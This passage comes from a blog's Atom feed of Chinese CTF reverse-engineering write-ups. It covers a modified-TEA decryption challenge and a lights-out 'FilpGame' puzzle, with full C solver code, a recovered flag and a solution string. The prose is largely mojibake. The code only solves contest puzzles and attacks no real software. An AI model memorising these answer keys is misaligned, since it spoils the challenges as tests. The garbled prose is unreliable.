src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403215520889.png" alt="image-20210403215520889"></p><p>åé¢å¼€å§‹ç”¨å¯†é’¥åˆå§‹åŒ–ä¸€ä¸ªå¯†é’¥å¯¹è±¡ï¼Œä»å¯†é’¥é•¿åº¦å¼€å§‹è¿˜æ˜¯ä»¥ä¸ºaesåŠ å¯†ï¼Œæµ‹è¯•åå‘ç°å¹¶ä¸æ˜¯ï¼Œï¼Œ</p><p>å…³é”®æ˜¯è¿™é‡Œçš„åŠ å¯†è¿˜æ˜¯8ä¸ªä¸€ç»„ï¼Œåˆ†2æ¬¡åŠ å¯†ï¼Œä¸”å¯†é’¥é•¿åº¦åˆæ˜¯16ï¼Œè¿™å°±æ’é™¤aeså’ŒdesåŠ å¯†äº†ã€‚</p><p>ç„¶åæ˜¯ä»myCipherå­—ç¬¦ä¸²è®©æˆ‘æƒ³åˆ°è¿™åº”è¯¥æ˜¯ä½œè€…è‡ªå·±å†™çš„ä¸€ä¸ªåŠ å¯†ï¼Œè¿›è€Œè¿›å…¥åŠ å¯†å‡½æ•°åˆ†æï¼š<br>é¦–å…ˆä»åŠ¨è°ƒåˆ†æçŸ¥é“ä¸‹é¢è¿™ä¸ªå‡½æ•°å°±æ˜¯äº¤æ¢æ•°æ®å­—èŠ‚é¡ºåºï¼Œ<strong>_byteswap_ulongï¼ˆï¼‰</strong>ï¼Œè¿™é‡Œå¼€å§‹è°ƒç”¨äº†2æ¬¡ï¼Œç»“æŸè°ƒç”¨äº†2æ¬¡è¿˜åŸã€‚åˆ†ä¸º2ç»„ï¼Œæ­£å¥½å–äº†8ä¸ªå­—èŠ‚ã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403220950328.png" alt="image-20210403220950328"></p><p>æ¥ç€å°±æ˜¯å…³é”®åŠ å¯†æ¨¡æ¿äº†ï¼Œè¯´å®è¯ï¼Œéš¾çœ‹ï¼Œå…¶å®å°±æ˜¯é­”æ”¹çš„teaåŠ å¯†ï¼Œåˆ†ææ•°æ®æ—¶ç»†å¿ƒç‚¹ã€‚ã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403221308523.png" alt="image-20210403221308523"></p><p>æŠŠä¸Šé¢çš„åŠ å¯†åŒ–ç®€ä¸€ä¸‹ï¼Œå¾—åˆ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enc[<span class="number">0</span>] += (enc[<span class="number">1</span>] + ((enc[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>)^(<span class="number">16</span>*enc[<span class="number">1</span>]))) ^ (key[v23]+v22);</span><br><span class="line">enc[<span class="number">1</span>] += (enc[<span class="number">0</span>] + ((enc[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>) ^ (<span class="number">16</span>*enc[<span class="number">0</span>]))) ^ (key[v25]+v22+<span class="number">0x12345678</span>);</span><br></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯è§£å¯†ï¼šæ³¨æ„ç»†å¿ƒå§ã€‚ã€‚è¿™é‡Œå› ä¸ºåŠ å·è¿ç®—ç¬¦ä¼˜å…ˆçº§å¤§äºå¼‚æˆ–ï¼Œæˆ‘åˆå¿˜äº†åœ¨ä»–ä»¬ä¸€èµ·æ—¶ç»™å¼‚æˆ–åŠ ä¸€ä¸ªæ‹¬å·ï¼Œä¸€ç›´è§£å¯†å‡ºé”™ï¼ŒçœŸå°±ç¡¬çœ‹äº†äºŒä¸ªå°æ—¶ã€‚ã€‚ã€‚1ä¸ªæ‹¬å·ï¼Œ2ä¸ªå°æ—¶ã€‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> opcode[<span class="number">100000</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> KEY[] = &#123;<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">10</span>, </span><br><span class="line"><span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ENC[] = &#123;<span class="number">14</span>, <span class="number">195</span>, <span class="number">17</span>, <span class="number">240</span>, <span class="number">69</span>, <span class="number">199</span>, <span class="number">154</span>, <span class="number">243</span>, <span class="number">237</span>, <span class="number">245</span>,</span><br><span class="line">   <span class="number">217</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">39</span>, <span class="number">2</span>, <span class="number">203</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tea_decode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *key = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)KEY;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *enc = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ENC+<span class="number">8</span>*i);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">31</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">enc[<span class="number">1</span>] -= (enc[<span class="number">0</span>] + ((enc[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>) ^ (<span class="number">16</span>*enc[<span class="number">0</span>]))) ^ (key[opcode[<span class="number">3</span>*j+<span class="number">2</span>]]+opcode[<span class="number">3</span>*j]+<span class="number">0x12345678</span>);</span><br><span class="line">enc[<span class="number">0</span>] -= (enc[<span class="number">1</span>] + ((enc[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>) ^ (<span class="number">16</span>*enc[<span class="number">1</span>]))) ^ (key[opcode[<span class="number">3</span>*j+<span class="number">1</span>]]+opcode[<span class="number">3</span>*j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> enc[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = enc[i];</span><br><span class="line">        enc[i] = enc[<span class="number">3</span>-i];</span><br><span class="line">        enc[<span class="number">3</span>-i] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v17 = <span class="number">0</span>, v18 = <span class="number">0</span>, v22, v23, v25;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(v17 &lt; <span class="number">32</span>)</span><br><span class="line">&#123;</span><br><span class="line">v22 = v18;</span><br><span class="line">v23 = v18&amp;<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">v18 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v22+<span class="number">0x12345678</span>);</span><br><span class="line">v25 = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v18 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">opcode[v17*<span class="number">3</span>] = v22;</span><br><span class="line">opcode[v17*<span class="number">3</span>+<span class="number">1</span>] = v23;</span><br><span class="line">opcode[v17*<span class="number">3</span>+<span class="number">2</span>] = v25;</span><br><span class="line">v17++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i += <span class="number">4</span>) <span class="comment">//äº¤æ¢å­—èŠ‚åº</span></span><br><span class="line">    &#123;</span><br><span class="line">        swap(ENC+i);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>); </span><br><span class="line">tea_decode();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i += <span class="number">4</span>) <span class="comment">//äº¤æ¢å­—èŠ‚åº</span></span><br><span class="line">    &#123;</span><br><span class="line">        swap(ENC+i);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag&#123;"</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">4</span> || i == <span class="number">6</span> || i == <span class="number">8</span> || i == <span class="number">10</span>)</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'-'</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%x"</span>, ENC[i]);</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag&#123;3bbcf9ea-2918-4fee-8a2e-201b47dfcb4e&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ç¬¬äºŒå±Šè™ç¬¦CTFï¼Œåˆ†äº«ä¸€ä¸‹é€†å‘é¢˜è§£ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>vnctf2021</title>
    <link href="https://www.bxnop.cn/2021/03/18/vnctf2021/"/>
    <id>https://www.bxnop.cn/2021/03/18/vnctf2021/</id>
    <published>2021-03-18T05:30:37.000Z</published>
    <updated>2021-04-24T13:02:33.974Z</updated>
    
    <content type="html"><![CDATA[<p>å°±å¯¹å…¶ä¸­æ„Ÿè§‰æœ‰æ„æ€çš„2ä¸ªé€†å‘é¢˜åšä¸€ä¸‹è®°å½•ï¼Œä¹Ÿæ˜¯å¤ç°ï¼Œå½“æ—¶æ²¡åšå‡ºæ¥ã€‚<a id="more"></a></p><p>å…¶ä¸­ç¬¬ä¸€ä¸ªæ˜¯å½“æ—¶ç®—æ³•å†™ä¸æ¥ï¼Œå¤ªå¼±äº†ã€‚å¦å¤–ä¸€æ˜¯appä½¿ç”¨hookæ›´æ”¹äº†å¯†é’¥ï¼Œä½†æ˜¯æˆ‘å¯¹ç¨‹åºé‡æ‰“åŒ…åï¼Œè¿™ä¸ªhookå¤±æ•ˆäº†ï¼Œå¯¼è‡´ä¸€ç›´è§£å¯†å‡ºé”™åˆæ‰¾ä¸åˆ°åŸå› ã€‚</p><h2 id="FilpGame"><a href="#FilpGame" class="headerlink" title="FilpGame"></a>FilpGame</h2><p>æ•´ä¸ªç¨‹åºå°±ä¸€ä¸ªmainå‡½æ•°ã€‚</p><p>è¾“å…¥é•¿åº¦è¦å°äº214ï¼Œå¯¹è¾“å…¥çš„æ¯2ä¸ªå…ˆè¿›è¡Œä¸€ä¸ªint(x, 16)æ“ä½œï¼Œç„¶åè¿›è¡Œç¨‹åºçš„å…³é”®æ“ä½œï¼Œä¹Ÿå°±æ˜¯å¥‡æ•°ä½æ‰æ“ä½œï¼š</p><p><img src="/2021/03/18/vnctf2021/image-20210421134509045.png" alt="image-20210421134509045"></p><p>åœ¨è¿›è¡Œçš„å…³é”®æ“ä½œå¼€å§‹å‰å°±è¦æ±‚æˆ‘ä»¬è¾“å…¥çš„æ¯2ä¸ªä½è¿›è¡Œhex.decode()æ“ä½œåçš„å€¼æ˜¯é€’å¢åºåˆ—ï¼Œä»åé¢å¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œå®é™…å°±æ˜¯è§„å®šäº†æˆ‘ä»¬è¾“å…¥åæ ‡æ˜¯é¡ºåºï¼Œé€’å¢ã€‚</p><p><img src="/2021/03/18/vnctf2021/image-20210421134750425.png" alt="image-20210421134750425"></p><p>åé¢å°±æ˜¯å…³é”®å¤„ç†è¾“å…¥çš„åœ°æ–¹äº†ï¼Œç¨‹åºçš„å…³é”®ï¼Œå°±æ˜¯ä½æ“ä½œã€‚</p><p><img src="/2021/03/18/vnctf2021/image-20210421190532649.png" alt="image-20210421190532649"></p><p>å…ˆç†Ÿæ‚‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š</p><ul><li><strong>x ^ 0 = x</strong></li><li><strong>x ^ 1 = !x</strong></li></ul><p>ç„¶åå…¶å®ä¸Šé¢çš„å°±æ˜¯æ“ä½œä¸€ä¸ª16*16çš„çŸ©é˜µï¼Œåªä¸è¿‡ç”¨äº†16ä¸ªwordå‹æ•°æ®çš„æ¯ä¸€ä¸ªbitä½è¿›è¡Œå­˜å‚¨ï¼ˆçœŸæ˜¯ä¸ªå¥½æƒ³æ³•ï¼‰ï¼Œå¯¹è¾“å…¥åæ ‡å’Œå®ƒä¸Šä¸‹å·¦å³è¿›è¡Œbitåè½¬ï¼Œ0å˜1ï¼Œ1å˜0ã€‚</p><p>æœ€åç¨‹åºçš„æ¯”è¾ƒå°±æ˜¯æ•´ä¸ª16*16çš„çŸ©é˜µå…¨ä¸º1ï¼Œè¿™å…¶å®æ˜¯ä¸€ä¸ªç‚¹ç¯æ¸¸æˆ/ç¿»è½¬æ¸¸æˆï¼Œå…¸å‹çš„ç®—æ³•é¢˜äº†ï¼Œä½†æ—¶é—´è¦æ±‚ä¸Šå®½æ¾äº†ä¸å°‘ã€‚ã€‚</p><p>å¤ªå¼±äº†ï¼Œå†™ä¸æ¥ï¼Œæ¯”èµ›æ—¶ä¹Ÿå¡åœ¨äº†è¿™é‡Œï¼Œèµ›åå‘ç°å¤§å®¶æœ‰çš„ç«Ÿç„¶ç›´æ¥æ˜¯æ‰¾äº†ç½‘ä¸Šç°æˆçš„è„šæœ¬ï¼Œæœç´¢çš„é‡è¦æ€§ã€‚ã€‚</p><p>çœ‹äº†wpï¼Œé‡‡ç”¨çˆ†ç ´ç¬¬ä¸€è¡Œçš„æ‰€æœ‰å¯èƒ½ï¼ˆ2^16ï¼‰ï¼Œæ¥ç€æ¨å‡ºç¬¬äºŒè¡Œçš„æƒ…å†µï¼Œä¾æ¬¡è¿›è¡Œä¸‹å»ï¼Œå¦‚æœæœ€åä¸€è¡Œéƒ½æ˜¯1åˆ™æ»¡è¶³æ¡ä»¶ã€‚</p><p>è¿™ç§æƒ³æ³•ç¡®å®å¯è¡Œï¼Œè€Œä¸”å®ç°èµ·æ¥ä¹Ÿä¸éš¾ï¼Œå…¶å®å°±æ˜¯æŠŠæ‰€æœ‰å¯èƒ½ç¿»çš„æƒ…å†µç©·ä¸¾ï¼Œç„¶åæ‰¾æœ€å°è§£ã€‚</p><p>è€Œè¿™ç§åšæ³•å¦‚æœä¸ç”¨æœç´¢æ¥åšçš„è¯ï¼Œ<strong>æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä½•ç©·ä¸¾ç¬¬ä¸€è¡Œçš„æ‰€æœ‰æƒ…å†µå‘¢ï¼Œä¸€ä¸ªå¥½åŠæ³•ï¼šå› ä¸ºã€0-2^16-1ã€‘æ¯ä¸ªæ•°çš„äºŒè¿›åˆ¶ä½éƒ½ä¸ä¸€æ ·ï¼Œä¸”åªæœ‰16ä½ï¼Œé‚£ä¹ˆæ¯æ¬¡å‘å³ç§»ä½ã€0-15ã€‘ï¼Œå¦‚æœä¸º1å°±åè½¬ï¼Œè¿™æ ·å°±å®ç°äº†ã€‚</strong></p><p><img src="/2021/03/18/vnctf2021/image-20210421200351125.png" alt="image-20210421200351125"></p><p>æœ€åæ•´ä½“ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">min</span> = <span class="number">500</span>, cnt, flag;</span><br><span class="line"><span class="keyword">int</span> dx[] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">16</span>][<span class="number">16</span>], b[<span class="number">16</span>][<span class="number">16</span>], fi;</span><br><span class="line"><span class="keyword">char</span> ans[<span class="number">1000</span>], tmp[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">to_hex</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt;= <span class="number">10</span> ? a<span class="number">-10</span>+<span class="number">65</span>:a+<span class="number">48</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">filp</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cnt++;</span><br><span class="line">tmp[fi++] = to_hex(y), tmp[fi++] = to_hex(x);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> x1 = x+dx[i];</span><br><span class="line"><span class="keyword">int</span> y1 = y+dy[i];</span><br><span class="line"><span class="keyword">if</span>(x1 &gt;= <span class="number">0</span> &amp;&amp; x1 &lt; <span class="number">16</span> &amp;&amp; y1 &gt;=<span class="number">0</span> &amp;&amp; y1 &lt; <span class="number">16</span>)</span><br><span class="line">b[x1][y1] ^= <span class="number">1</span>;  </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, k;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; <span class="number">16</span>); i++)</span><br><span class="line">&#123;</span><br><span class="line">cnt = <span class="number">0</span>, flag = <span class="number">0</span>, fi = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(tmp, <span class="number">0</span>, <span class="keyword">sizeof</span>(tmp));</span><br><span class="line"><span class="built_in">memcpy</span>(b, a, <span class="keyword">sizeof</span>(a));</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((i &gt;&gt; j)&amp;<span class="number">1</span>)</span><br><span class="line">filp(<span class="number">0</span>, j);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">15</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(b[j][k] == <span class="number">0</span>)</span><br><span class="line">filp(j+<span class="number">1</span>, k);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(b[<span class="number">15</span>][j] == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(cnt &lt; <span class="built_in">min</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(ans, tmp, <span class="number">1000</span>);</span><br><span class="line"><span class="built_in">min</span> = cnt;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">min</span> == <span class="number">500</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">min</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">int</span> enc[] = &#123;<span class="number">48885</span>, <span class="number">35772</span>, <span class="number">41193</span>, <span class="number">29456</span>, <span class="number">55568</span>, <span class="number">41901</span>,</span><br><span class="line"> <span class="number">52406</span>, <span class="number">19934</span>, <span class="number">13388</span>, <span class="number">15318</span>, <span class="number">26385</span>, <span class="number">34447</span>, <span class="number">7290</span>, <span class="number">33829</span>, <span class="number">27405</span>, <span class="number">6988</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">a[i][j] = (enc[i] &gt;&gt; (<span class="number">15</span>-j)) &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(fun() &gt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">puts</span>(ans);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"not found!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D81949596999B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœï¼Œæœ€åmd5ä¸€ä¸‹ã€‚</p><p>åˆå»æœé›†èµ„æ–™ï¼Œå¯ä»¥çœ‹è¿™ä¸ªé¢˜ä½œä¸ºå‚è€ƒ<a href="https://blog.csdn.net/mjj1024/article/details/80208428" target="_blank" rel="noopener">filp game</a>ã€‚ç„¶åæƒ³äº†å¾ˆä¹…é€’å½’çš„å†™æ³•ï¼Œæ€æƒ³å…¶å®è¿˜æ˜¯ä¸€æ ·ï¼Œä»ç¬¬ä¸€è¡Œå¼€å§‹ï¼Œä¸€è¡Œä¸€è¡Œçš„ç¡®å®šéƒ½æ˜¯1ï¼Œè‹¥è¾¾ä¸åˆ°å°±å›æº¯ï¼Œç›´åˆ°æœ€åä¸€è¡Œï¼Œç„¶åæ£€æŸ¥æ˜¯å¦å…¨ä¸º1ã€‚</p><p>ä¸Šé¢è¯´çš„åªæ˜¯åŠ äº†æ¯ä¸€è¡Œæ“ä½œå®Œåçš„åˆ¤æ–­ï¼Œä½†ä»ç„¶æ˜¯å…¨æœï¼Œ16*16çš„è§„æ¨¡è¿˜æ˜¯å¤ªå¤§äº†ï¼Œä¸å¯è¡Œã€‚</p><p>å¼€å§‹æ”¹è¿›ï¼Œä½¿ç”¨çˆ†ç ´ä¸€æ 